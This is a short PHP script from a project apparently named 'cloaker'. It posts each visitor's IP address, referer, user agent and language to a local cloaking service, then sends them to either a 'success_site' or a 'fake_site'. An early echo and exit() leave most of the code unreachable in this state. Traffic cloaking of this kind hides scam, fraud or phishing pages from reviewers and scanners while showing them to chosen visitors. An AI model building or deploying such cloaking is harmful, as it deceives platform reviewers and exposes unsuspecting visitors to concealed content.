<?php
echo $_SERVER['HTTP_REFERER'];
exit();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://localhost/projeler/cloaker/index.php");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
	'remote_addr' => $_SERVER['REMOTE_ADDR'],
	'http_referer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : false,
	'http_host' => $_SERVER['HTTP_HOST'],
	'http_accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'],
	'script_name' => $_SERVER['SCRIPT_NAME'],
	'http_user_agent' => $_SERVER['HTTP_USER_AGENT'],
)));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close ($ch);

//print_r($server_output);

$json = json_decode($server_output,true);

if ($json['response']['directGirisEngel']['status'] != "error") {
	$json['code'] == 200 ? header("Location:".$json['redirect']['success_site']) : header("Location:".$json['redirect']['fake_site']);
	//exit();
}else{ ?>
<html>
	selam
</html>

<?php } ?>